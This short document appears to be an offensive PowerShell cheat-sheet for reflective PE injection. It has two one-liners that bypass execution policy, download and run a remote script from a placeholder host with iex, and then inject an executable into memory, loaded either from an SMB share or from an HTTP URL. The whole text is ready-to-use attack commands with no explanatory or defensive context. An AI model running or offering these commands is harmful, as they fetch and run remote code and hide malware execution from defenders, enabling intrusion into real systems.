# Powershell PE Reflective Injection

<details>

<summary>Reflective PE Injection over SMB</summary>

```powershell
powershell -ep bypass -sta -nop -c "iex (iwr http://IP/empire.ps1 -UseBasicParsing); $PEBytes = [IO.File]::ReadAllBytes('\\IP\\Share\\File'); Invoke-ReflectivePEInjection -PEBytes $PEBytes"
```

</details>

<details>

<summary>Reflective PE Injection over HTTP</summary>

```powershell
powershell -ep bypass -nop -c "iex (iwr http://IP/Invoke-ReflectivePEInjection.ps1.1 -UseBasicParsing);Invoke-ReflectivePEInjection -PEURL http://IP/file.exe"
```

</details>
